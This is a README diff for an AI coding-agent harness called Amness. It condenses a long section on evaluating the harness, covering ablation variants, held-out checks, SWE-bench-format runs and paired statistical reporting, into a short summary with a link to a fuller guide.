+Three layers with one-way dependencies: the **UI** (`cli/`) drives the **agent** (`src/code.ts`, `src/deep.ts`) built on the **harness** (`src/harness.ts`); models are plain functions injected from outside, so everything in `src/` works as a library and the runtime has no dependencies. Diagram, file map and how the full-screen renderer draws: [docs/architecture.md](docs/architecture.md). The loop itself (steering, budgets, staged compaction, guards, the claims ledger, the optional reviewer, cache behaviour) and the papers behind it: [docs/agent-loop.md](docs/agent-loop.md).
 
 ## Evaluating the harness
 
-Every guard and efficiency feature can be switched off, so "does this help?" is a measurement, not an opinion:
-
-```bash
-amness eval --selftest                       # prove every task is solvable and its held-out check is sound (no model, free)
-amness eval --variants ab --trials 3         # baseline (no guards) vs full harness on 13 built-in tasks
-amness eval --variants ablate --trials 5     # full harness, then each guard removed in turn
-amness eval --cases ./my-tasks --jobs 3      # your own tasks: a folder of *.json
-amness eval --report .amness/evals/<run>.json   # re-analyse saved results, runs nothing
-```
-
-Each task runs in a fresh temporary workspace. The agent sees the task and an optional `verify` command; a **held-out `check`** it never sees decides pass or fail. Variants: `baseline`, `full`, `full+check`, `no-gate`, and `full-<guard>` for each of `nudge loop compact stuck wrapup condense schedule ledger stagnation index`.
-
-What the report gives you, and why:
-
-- **Tasks are the unit of analysis.** Repeated trials of one task are correlated, so intervals are 95% bootstrap intervals over tasks, and comparisons are paired by task.
-- **A paired comparison against the baseline:** change in pass rate with its interval, wins/losses/ties, an exact sign test (McNemar's exact test on the tasks where two variants differ) with Holm correction across variants, and a verdict of `better`, `worse` or `inconclusive`.
-- **Reliability, not just a pass rate:** `pass^k` is the chance that k attempts at a task *all* pass, which exposes variants that only succeed sometimes.
-- **Cost per solved task, not per run:** a variant that is cheap because it gives up is not efficient. A `●` marks variants on the pass-rate versus tokens-per-solve Pareto frontier.
-- **Why a variant behaves as it does:** how often each guard fired per run (nudges, loop blocks, rejected finishes, trimmed output).
-- **An honest power note.** With 12 tasks only large differences (about 60 points) are detectable; the report says so instead of declaring a winner. Add tasks with `--cases` before trusting a small difference.
-
-**Public benchmarks (SWE-bench format).** `amness eval --suite instances.jsonl --test-cmd "python -m pytest -x -q {tests}" --install "pip install -e ." --limit 20` loads instances in SWE-bench's field names, clones each repository at its base commit, lets the agent work, and only then applies the hidden tests from a file outside the workspace and runs the instance's FAIL_TO_PASS ids. An instance that cannot be prepared (missing commit, failed install) is **excluded and listed in an exclusion ledger** in the report, never silently counted as a failure. `--audit` checks the suite for contamination without calling a model (fix lines present in the problem statement, or already in the base checkout, or a missing base commit), `--trials` gives independent seeds and `--seed` makes the bootstrap intervals reproducible. Most public benchmarks need per-instance environments (usually Docker images) that you must provide through `--install` or a prepared image; Amness supplies the harness and the statistics, and has not been run against a full public benchmark yet.
-
-The method follows recent evaluation practice: harness choice can change cost per solved task by large factors while pass-rate differences stay small ([The Scaffold Effect in Coding Agents](https://arxiv.org/abs/2607.22585)), and task-level paired bootstrap intervals are the right uncertainty statement ([Harness or Model?](https://arxiv.org/html/2609.11987v1)). The built-in suite is small and synthetic; it is a regression harness for the guards, not a substitute for SWE-bench-style benchmarks, and a real run costs real tokens (the command asks before starting).
+Every guard and feature can be switched off, so "does this help?" is a measurement: `amness eval --selftest` (free), `--variants ab` (guards or none), `--variants ablate` (each guard removed in turn), `--cases ./my-tasks`, `--suite instances.jsonl` for SWE-bench-format benchmarks, `--builtin adversarial` for prompt-injection attempts. Reports use task-level bootstrap intervals, paired sign tests with Holm correction, `pass^k`, tokens per solved task and an exclusion ledger, and say plainly when the data cannot decide. Full guide: [docs/evaluation.md](docs/evaluation.md).
 
 ## Safety and privacy
 
